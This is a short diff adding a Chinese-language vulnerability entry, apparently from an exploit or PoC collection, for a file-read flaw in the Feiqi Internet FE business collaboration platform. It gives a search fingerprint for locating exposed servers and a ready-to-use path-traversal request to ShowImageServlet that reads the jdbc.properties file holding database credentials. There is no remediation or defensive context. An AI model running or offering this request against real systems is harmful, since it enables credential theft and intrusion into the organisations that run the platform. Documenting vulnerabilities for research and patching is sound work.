@@ -1,0 +1,10 @@
+漏洞描述：
+FE 办公协作平台是实现应用开发、运行、管理、维护的信息管理平台。飞企互联 FE 业务协作平台存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件获取大量敏感信息。
+漏洞影响 ： 飞企互联 FE业务协作平台 
+ 网络测绘：
+“flyrise.stopBackspace.js”
+
+
+
+验证POC
+/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
